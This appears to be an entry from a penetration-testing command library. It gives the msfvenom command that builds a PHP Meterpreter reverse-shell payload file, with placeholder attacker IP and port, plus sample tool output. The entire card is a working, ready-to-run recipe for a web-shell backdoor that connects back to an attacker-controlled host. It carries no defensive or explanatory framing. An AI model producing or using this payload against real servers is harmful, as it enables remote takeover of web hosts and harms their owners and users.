---
id: c8a2f10e-c0d9-486d-8df6-0d2636b2a2b1
name: msfvenom Meterpreter PHP script reverse shell
type: command
executor: null
data: msfvenom -p php/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f
  raw > msf.php
output: 'root@hackers:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.162.187
  LPORT=1337 -f raw > msf.php

  [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload

  [-] No arch selected, selecting arch: php from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 1115 bytes'
created_at: '2019-09-17T17:31:17.996755+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[msfvenom]]'
---

# msfvenom Meterpreter PHP script reverse shell

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > msf.php
```

## Expected Output

```
root@hackers:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.162.187 LPORT=1337 -f raw > msf.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1115 bytes
```


